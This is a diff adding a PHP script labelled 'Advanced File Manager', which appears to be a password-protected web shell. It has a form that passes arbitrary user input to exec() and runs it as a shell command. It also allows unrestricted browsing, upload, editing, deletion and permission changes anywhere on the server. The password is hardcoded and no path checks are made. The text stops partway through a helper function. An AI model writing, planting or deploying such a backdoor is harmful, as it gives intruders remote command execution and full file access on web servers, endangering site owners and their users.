@@ -1,0 +1,993 @@
+<?php
+// ============================================
+// Advanced File Manager - Unlimited Version
+// ============================================
+
+session_start();
+
+// ==================== Configuration ====================
+define('PASSWORD', '#R4h4s[1a85$C0l3\K!!++'); // Change this password
+define('SESSION_KEY', 'file_manager_session');
+
+// ==================== Authentication ====================
+function checkAuth() {
+    if (!isset($_SESSION[SESSION_KEY]) || $_SESSION[SESSION_KEY] !== true) {
+        if (isset($_POST['password']) && $_POST['password'] === PASSWORD) {
+            $_SESSION[SESSION_KEY] = true;
+            header('Location: ' . $_SERVER['PHP_SELF']);
+            exit;
+        }
+        return false;
+    }
+    return true;
+}
+
+function loginForm() {
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Advanced File Manager</title>
+        <style>
+            * { margin:0; padding:0; box-sizing:border-box; }
+            body { 
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                font-family: 'Segoe UI', Arial, sans-serif;
+                height: 100vh;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+            .login-box {
+                background: white;
+                padding: 50px 40px;
+                border-radius: 20px;
+                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+                width: 380px;
+            }
+            .login-box h1 {
+                text-align: center;
+                margin-bottom: 30px;
+                color: #333;
+                font-size: 28px;
+            }
+            .login-box input[type="password"] {
+                width: 100%;
+                padding: 15px 20px;
+                border: 2px solid #e0e0e0;
+                border-radius: 10px;
+                font-size: 16px;
+                transition: 0.3s;
+                margin-bottom: 20px;
+            }
+            .login-box input[type="password"]:focus {
+                border-color: #667eea;
+                outline: none;
+                box-shadow: 0 0 0 3px rgba(102,126,234,0.2);
+            }
+            .login-box button {
+                width: 100%;
+                padding: 15px;
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                color: white;
+                border: none;
+                border-radius: 10px;
+                font-size: 18px;
+                font-weight: 600;
+                cursor: pointer;
+                transition: 0.3s;
+            }
+            .login-box button:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 10px 30px rgba(102,126,234,0.4);
+            }
+            .error {
+                color: #e74c3c;
+                text-align: center;
+                margin-bottom: 15px;
+                font-weight: 500;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="login-box">
+            <h1>🔐 Advanced File Manager</h1>
+            <form method="POST">
+                <?php if (isset($_POST['password']) && $_POST['password'] !== PASSWORD): ?>
+                    <div class="error">❌ Incorrect password</div>
+                <?php endif; ?>
+                <input type="password" name="password" placeholder="Enter password" required autofocus>
+                <button type="submit">Login</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+if (!checkAuth()) {
+    loginForm();
+}
+
+// ==================== Core Functions ====================
+
+$scriptDir = dirname($_SERVER['SCRIPT_FILENAME']);
+$currentDir = isset($_GET['dir']) ? $_GET['dir'] : '';
+$showHidden = isset($_GET['show_hidden']) && $_GET['show_hidden'] == '1';
+
+if (!empty($currentDir)) {
+    $currentPath = realpath($currentDir);
+    if ($currentPath === false) {
+        $currentPath = $scriptDir;
+        $currentDir = '';
+    }
+} else {
+    $currentPath = $scriptDir;
+    $currentDir = '';
+}
+
+// ==================== Command Execution ====================
+if (isset($_POST['execute_cmd']) && isset($_POST['command'])) {
+    $command = $_POST['command'];
+    $output = [];
+    $return_var = 0;
+    
+    // Execute command
+    exec($command . ' 2>&1', $output, $return_var);
+    $cmd_result = implode("\n", $output);
+    
+    // Store result for display
+    $_SESSION['cmd_result'] = $cmd_result;
+    $_SESSION['cmd_command'] = $command;
+    
+    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir) . '&cmd=1');
+    exit;
+}
+
+// ==================== File Operations ====================
+
+// Create folder
+if (isset($_POST['create_folder']) && isset($_POST['folder_name'])) {
+    $folderName = trim($_POST['folder_name']);
+    if (!empty($folderName)) {
+        $newPath = $currentPath . DIRECTORY_SEPARATOR . $folderName;
+        if (!file_exists($newPath)) {
+            mkdir($newPath, 0777, true);
+        }
+    }
+    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir));
+    exit;
+}
+
+// Create file
+if (isset($_POST['create_file']) && isset($_POST['file_name'])) {
+    $fileName = trim($_POST['file_name']);
+    if (!empty($fileName)) {
+        $newPath = $currentPath . DIRECTORY_SEPARATOR . $fileName;
+        if (!file_exists($newPath)) {
+            file_put_contents($newPath, '');
+        }
+    }
+    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir));
+    exit;
+}
+
+// Upload file (unlimited)
+if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
+    $fileName = $_FILES['upload_file']['name'];
+    $targetPath = $currentPath . DIRECTORY_SEPARATOR . $fileName;
+    move_uploaded_file($_FILES['upload_file']['tmp_name'], $targetPath);
+    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir));
+    exit;
+}
+
+// Delete file/folder
+if (isset($_GET['delete'])) {
+    $deletePath = $currentPath . DIRECTORY_SEPARATOR . $_GET['delete'];
+    if (file_exists($deletePath)) {
+        if (is_file($deletePath)) {
+            unlink($deletePath);
+        } elseif (is_dir($deletePath)) {
+            function rrmdir($dir) {
+                if (is_dir($dir)) {
+                    $objects = scandir($dir);
+                    foreach ($objects as $object) {
+                        if ($object != "." && $object != "..") {
+                            if (is_dir($dir . DIRECTORY_SEPARATOR . $object)) {
+                                rrmdir($dir . DIRECTORY_SEPARATOR . $object);
+                            } else {
+                                unlink($dir . DIRECTORY_SEPARATOR . $object);
+                            }
+                        }
+                    }
+                    rmdir($dir);
+                }
+            }
+            rrmdir($deletePath);
+        }
+    }
+    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir));
+    exit;
+}
+
+// Rename
+if (isset($_POST['rename']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
+    $oldPath = $currentPath . DIRECTORY_SEPARATOR . $_POST['old_name'];
+    $newPath = $currentPath . DIRECTORY_SEPARATOR . $_POST['new_name'];
+    if (file_exists($oldPath) && !file_exists($newPath)) {
+        rename($oldPath, $newPath);
+    }
+    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir));
+    exit;
+}
+
+// Copy
+if (isset($_POST['copy']) && isset($_POST['copy_source']) && isset($_POST['copy_target'])) {
+    $source = $currentPath . DIRECTORY_SEPARATOR . $_POST['copy_source'];
+    $target = $currentPath . DIRECTORY_SEPARATOR . $_POST['copy_target'];
+    if (file_exists($source) && !file_exists($target)) {
+        if (is_file($source)) {
+            copy($source, $target);
+        } elseif (is_dir($source)) {
+            function rcopy($src, $dst) {
+                if (is_dir($src)) {
+                    mkdir($dst, 0777, true);
+                    $files = scandir($src);
+                    foreach ($files as $file) {
+                        if ($file != "." && $file != "..") {
+                            rcopy($src . DIRECTORY_SEPARATOR . $file, $dst . DIRECTORY_SEPARATOR . $file);
+                        }
+                    }
+                } else {
+                    copy($src, $dst);
+                }
+            }
+            rcopy($source, $target);
+        }
+    }
+    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir));
+    exit;
+}
+
+// Move
+if (isset($_POST['move']) && isset($_POST['move_source']) && isset($_POST['move_target'])) {
+    $source = $currentPath . DIRECTORY_SEPARATOR . $_POST['move_source'];
+    $target = $currentPath . DIRECTORY_SEPARATOR . $_POST['move_target'];
+    if (file_exists($source) && !file_exists($target)) {
+        rename($source, $target);
+    }
+    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir));
+    exit;
+}
+
+// Save file (edit)
+if (isset($_POST['save_file']) && isset($_POST['file_path']) && isset($_POST['content'])) {
+    $editPath = $_POST['file_path'];
+    if (file_exists($editPath) && is_file($editPath)) {
+        file_put_contents($editPath, $_POST['content']);
+    }
+    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir) . '&edit=' . urlencode(basename($editPath)));
+    exit;
+}
+
+// Download file
+if (isset($_GET['download'])) {
+    $downloadPath = $currentPath . DIRECTORY_SEPARATOR . $_GET['download'];
+    if (file_exists($downloadPath) && is_file($downloadPath)) {
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($downloadPath) . '"');
+        header('Content-Length: ' . filesize($downloadPath));
+        readfile($downloadPath);
+        exit;
+    }
+}
+
+// View file
+if (isset($_GET['view'])) {
+    $viewPath = $currentPath . DIRECTORY_SEPARATOR . $_GET['view'];
+    if (file_exists($viewPath) && is_file($viewPath)) {
+        $content = file_get_contents($viewPath);
+        $mime = mime_content_type($viewPath);
+        if (strpos($mime, 'image/') === 0) {
+            header('Content-Type: ' . $mime);
+            readfile($viewPath);
+            exit;
+        }
+        echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>View: " . htmlspecialchars($_GET['view']) . "</title>";
+        echo "<style>body{background:#1e1e1e;color:#d4d4d4;font-family:'Consolas','Courier New',monospace;padding:20px;white-space:pre-wrap;word-wrap:break-word;}</style>";
+        echo "</head><body>" . htmlspecialchars($content) . "</body></html>";
+        exit;
+    }
+}
+
+// Chmod
+if (isset($_POST['chmod']) && isset($_POST['chmod_path']) && isset($_POST['permissions'])) {
+    $chmodPath = $currentPath . DIRECTORY_SEPARATOR . $_POST['chmod_path'];
+    if (file_exists($chmodPath)) {
+        $perms = octdec($_POST['permissions']);
+        chmod($chmodPath, $perms);
+    }
+    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir));
+    exit;
+}
+
+// ==================== Display ====================
+
+$items = scandir($currentPath);
+$directories = [];
+$files = [];
+
+foreach ($items as $item) {
+    if ($item == '.' || $item == '..') continue;
+    if (!$showHidden && substr($item, 0, 1) == '.') continue;
+    $fullPath = $currentPath . DIRECTORY_SEPARATOR . $item;
+    if (is_dir($fullPath)) {
+        $directories[] = $item;
+    } else {
+        $files[] = $item;
+    }
+}
+sort($directories);
+sort($files);
+$allItems = array_merge($directories, $files);
+
+$editFile = isset($_GET['edit']) ? $_GET['edit'] : '';
+$editPath = $currentPath . DIRECTORY_SEPARATOR . $editFile;
+$editContent = '';
+if (!empty($editFile) && file_exists($editPath) && is_file($editPath)) {
+    $editContent = file_get_contents($editPath);
+}
+
+$showCmd = isset($_GET['cmd']) && $_GET['cmd'] == '1';
+$cmdResult = isset($_SESSION['cmd_result']) ? $_SESSION['cmd_result'] : '';
+$cmdCommand = isset($_SESSION['cmd_command']) ? $_SESSION['cmd_command'] : '';
+unset($_SESSION['cmd_result']);
+unset($_SESSION['cmd_command']);
+
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced File Manager</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { 
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #f0f2f5;
+            padding: 20px;
+        }
+        .container {
+            max-width: 100%;
+            margin: 0 auto;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            padding: 30px;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        .header h1 {
+            font-size: 24px;
+            color: #2c3e50;
+        }
+        .header .path {
+            background: #f8f9fa;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 13px;
+            word-break: break-all;
+            flex: 1;
+            min-width: 200px;
+        }
+        .btn {
+            display: inline-block;
+            padding: 8px 18px;
+            border: none;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-decoration: none;
+            color: white;
+        }
+        .btn-primary { background: #3498db; }
+        .btn-primary:hover { background: #2980b9; transform: translateY(-2px); }
+        .btn-success { background: #2ecc71; }
+        .btn-success:hover { background: #27ae60; transform: translateY(-2px); }
+        .btn-danger { background: #e74c3c; }
+        .btn-danger:hover { background: #c0392b; transform: translateY(-2px); }
+        .btn-warning { background: #f39c12; }
+        .btn-warning:hover { background: #e67e22; transform: translateY(-2px); }
+        .btn-info { background: #1abc9c; }
+        .btn-info:hover { background: #16a085; transform: translateY(-2px); }
+        .btn-purple { background: #9b59b6; }
+        .btn-purple:hover { background: #8e44ad; transform: translateY(-2px); }
+        .btn-dark { background: #34495e; }
+        .btn-dark:hover { background: #2c3e50; transform: translateY(-2px); }
+        .btn-sm { padding: 4px 12px; font-size: 12px; }
+        .btn-xs { padding: 2px 8px; font-size: 11px; }
+        
+        .toolbar {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-bottom: 15px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            align-items: center;
+        }
+        .toolbar form {
+            display: inline-flex;
+            gap: 8px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .toolbar input[type="text"], .toolbar input[type="file"] {
+            padding: 6px 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 13px;
+        }
+        
+        .cmd-area {
+            margin-bottom: 15px;
+            padding: 15px;
+            background: #1e1e1e;
+            border-radius: 10px;
+            border: 1px solid #333;
+        }
+        .cmd-area form {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .cmd-area input[type="text"] {
+            flex: 1;
+            min-width: 200px;
+            padding: 10px 15px;
+            background: #2d2d2d;
+            color: #d4d4d4;
+            border: 1px solid #444;
+            border-radius: 6px;
+            font-family: 'Consolas', monospace;
+            font-size: 14px;
+        }
+        .cmd-area input[type="text"]:focus {
+            outline: none;
+            border-color: #3498db;
+        }
+        .cmd-output {
+            margin-top: 10px;
+            background: #0d0d0d;
+            color: #d4d4d4;
+            padding: 15px;
+            border-radius: 6px;
+            font-family: 'Consolas', monospace;
+            font-size: 13px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            max-height: 400px;
+            overflow: auto;
+        }
+        .cmd-output .cmd-prompt {
+            color: #2ecc71;
+        }
+        
+        .table-wrap {
+            overflow-x: auto;
+            margin-top: 15px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13px;
+        }
+        th {
+            background: #f8f9fa;
+            padding: 10px 12px;
+            text-align: left;
+            font-weight: 600;
+            color: #2c3e50;
+            border-bottom: 2px solid #dee2e6;
+        }
+        td {
+            padding: 8px 12px;
+            border-bottom: 1px solid #ecf0f1;
+            vertical-align: middle;
+        }
+        tr:hover { background: #f8f9fa; }
+        .item-icon { font-size: 18px; margin-right: 6px; }
+        .item-name { font-weight: 500; }
+        .item-size { color: #7f8c8d; font-size: 12px; }
+        .item-time { color: #95a5a6; font-size: 12px; }
+        .actions { display: flex; gap: 4px; flex-wrap: wrap; }
+        .checkbox-col { width: 30px; text-align: center; }
+        .hidden-file { opacity: 0.6; }
+        
+        .editor-area {
+            margin-top: 20px;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            border: 1px solid #dee2e6;
+        }
+        .editor-area textarea {
+            width: 100%;
+            height: 400px;
+            padding: 15px;
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 14px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            resize: vertical;
+            background: #1e1e1e;
+            color: #d4d4d4;
+        }
+        .editor-area textarea:focus {
+            outline: none;
+            border-color: #3498db;
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal.active { display: flex; }
+        .modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 500px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .modal-content h3 { margin-bottom: 20px; }
+        .modal-content input, .modal-content select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+        }
+        
+        .badge {
+            display: inline-block;
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+        .badge-dir { background: #dbeafe; color: #1e40af; }
+        .badge-file { background: #e5e7eb; color: #374151; }
+        .badge-hidden { background: #fef3c7; color: #92400e; }
+        
+        .status-bar {
+            margin-top: 20px;
+            padding: 12px 20px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            color: #6c757d;
+            font-size: 13px;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+        }
+        
+        .quick-nav {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-bottom: 15px;
+            padding: 10px 15px;
+            background: #e8f0fe;
+            border-radius: 8px;
+            align-items: center;
+        }
+        .quick-nav input[type="text"] {
+            flex: 1;
+            min-width: 200px;
+            padding: 8px 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            font-family: monospace;
+        }
+        .quick-nav input[type="text"]:focus {
+            outline: none;
+            border-color: #3498db;
+            box-shadow: 0 0 0 3px rgba(52,152,219,0.2);
+        }
+        
+        @media (max-width: 768px) {
+            .container { padding: 15px; }
+            .header { flex-direction: column; align-items: stretch; }
+            .toolbar form { width: 100%; }
+            td { padding: 6px 8px; }
+            .actions { flex-wrap: wrap; }
+            .quick-nav { flex-direction: column; }
+            .quick-nav input[type="text"] { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>📂 Advanced File Manager</h1>
+        <div class="path">📁 <?php echo htmlspecialchars($currentPath); ?></div>
+        <div style="display:flex;gap:8px;flex-wrap:wrap;">
+            <a href="?dir=<?php echo urlencode(dirname($currentDir)); ?>" class="btn btn-primary">⬆ Up</a>
+            <a href="?dir=<?php echo urlencode($currentDir); ?>&show_hidden=<?php echo $showHidden ? '0' : '1'; ?>" class="btn btn-<?php echo $showHidden ? 'warning' : 'dark'; ?>">
+                <?php echo $showHidden ? '👁️ Hide Hidden' : '👁️ Show Hidden'; ?>
+            </a>
+        </div>
+    </div>
+    
+    <div class="quick-nav">
+        <span style="font-weight:600;color:#2c3e50;">🔍 Jump to:</span>
+        <form method="GET" style="display:flex;flex:1;gap:8px;flex-wrap:wrap;">
+            <input type="text" name="dir" placeholder="Enter full path" value="<?php echo htmlspecialchars($currentDir); ?>">
+            <input type="hidden" name="show_hidden" value="<?php echo $showHidden ? '1' : '0'; ?>">
+            <button type="submit" class="btn btn-primary">Go</button>
+            <a href="?" class="btn btn-info">Home</a>
+        </form>
+    </div>
+    
+    <!-- Command Execution -->
+    <div class="cmd-area">
+        <form method="POST">
+            <input type="text" name="command" placeholder="$ Enter shell command..." value="<?php echo htmlspecialchars($cmdCommand); ?>" autocomplete="off">
+            <button type="submit" name="execute_cmd" class="btn btn-dark">▶ Execute</button>
+        </form>
+        <?php if ($showCmd && $cmdResult !== ''): ?>
+        <div class="cmd-output">
+            <div class="cmd-prompt">$ <?php echo htmlspecialchars($cmdCommand); ?></div>
+            <?php echo htmlspecialchars($cmdResult); ?>
+        </div>
+        <?php endif; ?>
+    </div>
+    
+    <div class="toolbar">
+        <form method="POST">
+            <input type="text" name="folder_name" placeholder="Folder name" required>
+            <button type="submit" name="create_folder" class="btn btn-success">📁 New Folder</button>
+        </form>
+        
+        <form method="POST">
+            <input type="text" name="file_name" placeholder="File name" required>
+            <button type="submit" name="create_file" class="btn btn-info">📄 New File</button>
+        </form>
+        
+        <form method="POST" enctype="multipart/form-data">
+            <input type="file" name="upload_file" required>
+            <button type="submit" class="btn btn-purple">⬆ Upload</button>
+        </form>
+        
+        <form method="POST">
+            <select name="batch_action">
+                <option value="delete">🗑 Delete</option>
+            </select>
+            <button type="submit" class="btn btn-danger btn-sm" onclick="return confirm('Delete selected items?')">Execute</button>
+        </form>
+    </div>
+    
+    <div class="table-wrap">
+        <form id="batchForm" method="POST">
+            <input type="hidden" name="batch_action" id="batch_action" value="">
+            <table>
+                <thead>
+                    <tr>
+                        <th class="checkbox-col"><input type="checkbox" id="selectAll"></th>
+                        <th>Name</th>
+                        <th>Size</th>
+                        <th>Permissions</th>
+                        <th>Modified</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <?php if (count($allItems) === 0): ?>
+                    <tr><td colspan="6" style="text-align:center;color:#999;padding:40px;">Directory is empty</td></tr>
+                    <?php endif; ?>
+                    
+                    <?php foreach ($allItems as $item): 
+                        $fullPath = $currentPath . DIRECTORY_SEPARATOR . $item;
+                        $isDir = is_dir($fullPath);
+                        $isHidden = substr($item, 0, 1) == '.';
+                        $perms = substr(sprintf('%o', fileperms($fullPath)), -4);
+                        $size = $isDir ? '-' : formatSize(filesize($fullPath));
+                        $mtime = date('Y-m-d H:i:s', filemtime($fullPath));
+                        $icon = $isDir ? '📁' : ($isHidden ? '🔒' : '📄');
+                        $badge = $isDir ? '<span class="badge badge-dir">Dir</span>' : '<span class="badge badge-file">File</span>';
+                        if ($isHidden) $badge .= ' <span class="badge badge-hidden">Hidden</span>';
+                        $rowClass = $isHidden ? 'hidden-file' : '';
+                    ?>
+                    <tr class="<?php echo $rowClass; ?>">
+                        <td><input type="checkbox" name="selected_items[]" value="<?php echo htmlspecialchars($item); ?>" class="item-checkbox"></td>
+                        <td>
+                            <?php if ($isDir): ?>
+                                <a href="?dir=<?php echo urlencode($currentDir . DIRECTORY_SEPARATOR . $item); ?>&show_hidden=<?php echo $showHidden ? '1' : '0'; ?>" style="text-decoration:none;color:#2c3e50;">
+                                    <span class="item-icon"><?php echo $icon; ?></span>
+                                    <span class="item-name"><?php echo htmlspecialchars($item); ?></span>
+                                </a>
+                            <?php else: ?>
+                                <span class="item-icon"><?php echo $icon; ?></span>
+                                <span class="item-name"><?php echo htmlspecialchars($item); ?></span>
+                            <?php endif; ?>
+                            <?php echo $badge; ?>
+                        </td>
+                        <td class="item-size"><?php echo $size; ?></td>
+                        <td>
+                            <?php echo $perms; ?>
+                            <a href="#" onclick="showChmod('<?php echo htmlspecialchars($item); ?>', '<?php echo $perms; ?>'); return false;" class="btn btn-xs btn-warning">Chmod</a>
+                        </td>
+                        <td class="item-time"><?php echo $mtime; ?></td>
+                        <td class="actions">
+                            <?php if ($isDir): ?>
+                                <a href="?dir=<?php echo urlencode($currentDir . DIRECTORY_SEPARATOR . $item); ?>&show_hidden=<?php echo $showHidden ? '1' : '0'; ?>" class="btn btn-primary btn-xs">Open</a>
+                            <?php else: ?>
+                                <a href="?view=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($currentDir); ?>" target="_blank" class="btn btn-info btn-xs">View</a>
+                                <a href="?download=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($currentDir); ?>" class="btn btn-success btn-xs">Download</a>
+                                <a href="?edit=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($currentDir); ?>&show_hidden=<?php echo $showHidden ? '1' : '0'; ?>" class="btn btn-warning btn-xs">Edit</a>
+                            <?php endif; ?>
+                            <a href="#" onclick="showRename('<?php echo htmlspecialchars($item); ?>'); return false;" class="btn btn-primary btn-xs">Rename</a>
+                            <a href="#" onclick="showCopy('<?php echo htmlspecialchars($item); ?>'); return false;" class="btn btn-info btn-xs">Copy</a>
+                            <a href="#" onclick="showMove('<?php echo htmlspecialchars($item); ?>'); return false;" class="btn btn-purple btn-xs">Move</a>
+                            <a href="?delete=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($currentDir); ?>&show_hidden=<?php echo $showHidden ? '1' : '0'; ?>" onclick="return confirm('Delete <?php echo htmlspecialchars($item); ?>?')" class="btn btn-danger btn-xs">Delete</a>
+                        </td>
+                    </tr>
+                    <?php endforeach; ?>
+                </tbody>
+            </table>
+        </form>
+    </div>
+    
+    <?php if (!empty($editFile) && file_exists($editPath)): ?>
+    <div class="editor-area">
+        <h3>✏️ Editing: <?php echo htmlspecialchars($editFile); ?></h3>
+        <form method="POST">
+            <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($editPath); ?>">
+            <textarea name="content"><?php echo htmlspecialchars($editContent); ?></textarea>
+            <div style="margin-top:10px;">
+                <button type="submit" name="save_file" class="btn btn-success">💾 Save</button>
+                <a href="?dir=<?php echo urlencode($currentDir); ?>&show_hidden=<?php echo $showHidden ? '1' : '0'; ?>" class="btn btn-danger">Cancel</a>
+            </div>
+        </form>
+    </div>
+    <?php endif; ?>
+    
+    <div class="status-bar">
+        <span>📊 <?php echo count($allItems); ?> items</span>
+        <span>🔒 <?php echo substr(sprintf('%o', fileperms($currentPath)), -4); ?></span>
+        <span>💾 Free: <?php echo formatSize(disk_free_space($currentPath)); ?></span>
+        <span>📅 <?php echo date('Y-m-d H:i:s'); ?></span>
+        <span>📍 Script: <?php echo htmlspecialchars($scriptDir); ?></span>
+    </div>
+</div>
+
+<!-- Modals -->
+<div id="renameModal" class="modal">
+    <div class="modal-content">
+        <h3>✏️ Rename</h3>
+        <form method="POST" id="renameForm">
+            <input type="hidden" name="old_name" id="rename_old">
+            <label>New Name</label>
+            <input type="text" name="new_name" id="rename_new" required>
+            <div style="display:flex;gap:10px;">
+                <button type="submit" name="rename" class="btn btn-success">Rename</button>
+                <button type="button" onclick="closeModal('renameModal')" class="btn btn-danger">Cancel</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<div id="copyModal" class="modal">
+    <div class="modal-content">
+        <h3>📋 Copy</h3>
+        <form method="POST" id="copyForm">
+            <input type="hidden" name="copy_source" id="copy_source">
+            <label>Target Name</label>
+            <input type="text" name="copy_target" id="copy_target" required>
+            <div style="display:flex;gap:10px;">
+                <button type="submit" name="copy" class="btn btn-success">Copy</button>
+                <button type="button" onclick="closeModal('copyModal')" class="btn btn-danger">Cancel</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<div id="moveModal" class="modal">
+    <div class="modal-content">
+        <h3>📦 Move</h3>
+        <form method="POST" id="moveForm">
+            <input type="hidden" name="move_source" id="move_source">
+            <label>Target Name</label>
+            <input type="text" name="move_target" id="move_target" required>
+            <div style="display:flex;gap:10px;">
+                <button type="submit" name="move" class="btn btn-success">Move</button>
+                <button type="button" onclick="closeModal('moveModal')" class="btn btn-danger">Cancel</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<div id="chmodModal" class="modal">
+    <div class="modal-content">
+        <h3>🔒 Change Permissions</h3>
+        <form method="POST" id="chmodForm">
+            <input type="hidden" name="chmod_path" id="chmod_path">
+            <label>Permissions (e.g., 0777, 0755, 0644)</label>
+            <input type="text" name="permissions" id="chmod_perms" required placeholder="0755">
+            <div style="display:flex;gap:10px;">
+                <button type="submit" name="chmod" class="btn btn-success">Apply</button>
+                <button type="button" onclick="closeModal('chmodModal')" class="btn btn-danger">Cancel</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<script>
+function formatSize(bytes) {
+    if (bytes === 0) return '0 B';
+    var k = 1024;
+    var sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
+    var i = Math.floor(Math.log(bytes) / Math.log(k));
+    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+}
+
+function showModal(id) {
+    document.getElementById(id).classList.add('active');
+}
+
+function closeModal(id) {
+    document.getElementById(id).classList.remove('active');
+}
+
+function showRename(name) {
+    document.getElementById('rename_old').value = name;
+    document.getElementById('rename_new').value = name;
+    showModal('renameModal');
+}
+
+function showCopy(name) {
+    document.getElementById('copy_source').value = name;
+    document.getElementById('copy_target').value = name + '_copy';
+    showModal('copyModal');
+}
+
+function showMove(name) {
+    document.getElementById('move_source').value = name;
+    document.getElementById('move_target').value = name;
+    showModal('moveModal');
+}
+
+function showChmod(name, perms) {
+    document.getElementById('chmod_path').value = name;
+    document.getElementById('chmod_perms').value = perms;
+    showModal('chmodModal');
+}
+
+document.getElementById('selectAll').addEventListener('change', function() {
+    var checkboxes = document.querySelectorAll('.item-checkbox');
+    for (var i = 0; i < checkboxes.length; i++) {
+        checkboxes[i].checked = this.checked;
+    }
+});
+
+document.querySelectorAll('.modal').forEach(function(modal) {
+    modal.addEventListener('click', function(e) {
+        if (e.target === this) {
+            this.classList.remove('active');
+        }
+    });
+});
+
+document.querySelector('[name="batch_action"]').addEventListener('change', function() {
+    if (this.value) {
+        if (confirm('Execute batch operation?')) {
+            document.getElementById('batch_action').value = this.value;
+            document.getElementById('batchForm').submit();
+        }
+    }
+});
+
+document.querySelector('.quick-nav input[type="text"]').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+        this.form.submit();
+    }
+});
+
+// Command input history (simple)
+var cmdHistory = [];
+var cmdIndex = -1;
+var cmdInput = document.querySelector('.cmd-area input[name="command"]');
+if (cmdInput) {
+    cmdInput.addEventListener('keydown', function(e) {
+        if (e.key === 'ArrowUp') {
+            e.preventDefault();
+            if (cmdIndex < cmdHistory.length - 1) {
+                cmdIndex++;
+                this.value = cmdHistory[cmdHistory.length - 1 - cmdIndex] || '';
+            }
+        } else if (e.key === 'ArrowDown') {
+            e.preventDefault();
+            if (cmdIndex > 0) {
+                cmdIndex--;
+                this.value = cmdHistory[cmdHistory.length - 1 - cmdIndex] || '';
+            } else {
+                cmdIndex = -1;
+                this.value = '';
+            }
+        } else if (e.key === 'Enter') {
+            if (this.value.trim()) {
+                cmdHistory.push(this.value.trim());
+                cmdIndex = -1;
+            }
+        }
+    });
+}
+</script>
+</body>
+</html>
+<?php
+
+function formatSize($bytes) {
+    if ($bytes === false || $bytes === 0) return '0 B';
+    $k = 1024;
+    $sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
+    $i = floor(log($bytes) / log($k));
